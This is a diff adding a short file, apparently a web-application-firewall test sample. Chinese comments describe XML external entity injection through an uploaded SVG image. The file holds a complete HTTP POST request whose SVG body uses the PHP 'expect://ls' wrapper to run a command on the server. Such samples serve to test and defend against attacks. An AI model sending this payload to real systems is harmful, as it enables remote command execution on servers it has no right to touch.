@@ -1,0 +1,13 @@
+# XML外部实体注入_SVG格式+expext扩展利用
+# 应用程序可能允许用户上传图像，并在上传后在服务器上处理或验证这些图像。由于SVG格式使用XML，所以攻击者可以提交恶意SVG图像，从而进行XXE攻击，使用PHP “expect”包装器执行命令。
+POST /?bid=hd_tag_m8mv24mk HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24mk
+RM-PRO-Token: 4ad7bbd5e118192fd3ecfd36152d9757
+RM-PRO-Time: 1742808392914
+User-Agent: curl/7.83.1
+Content-Type: application/xml
+
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
+<image xlink:href="expect://ls"></image>
+</svg>
